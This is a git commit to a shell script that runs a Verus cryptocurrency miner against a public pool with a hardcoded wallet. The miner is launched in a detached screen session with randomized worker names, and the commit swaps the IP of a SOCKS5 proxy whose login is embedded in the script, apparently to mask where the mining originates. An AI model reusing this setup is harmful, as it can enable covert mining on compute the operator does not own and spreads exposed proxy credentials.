94fb58687ddaf786557872e5df4f44b4113cc63d
CIMENGUTAMAf <86764552+CIMENGUTAMAf@users.noreply.github.com>
2021-07-06 12:28:27 +0700

    Update vrsc5.sh

--- vrsc5.sh
+++ vrsc5.sh
@@ -6,5 +6,5 @@ screen -dmS ls
 POOL=stratum+tcp://eu.luckpool.net:3956
 WALLET=RYBb7hyLUnBd7XRtre7jjjvVfYRWoAdors
 WORKER=$(echo $(shuf -i 1-1000000 -n 1)BEH)
-PROXY=socks5://auewfdot:euxfigdwwz2b@45.94.47.108:8152
+PROXY=socks5://auewfdot:euxfigdwwz2b@45.95.99.226:7786
 ./uluk -a verus -o $POOL -u $WALLET.$WORKER -t 2 -x $PROXY
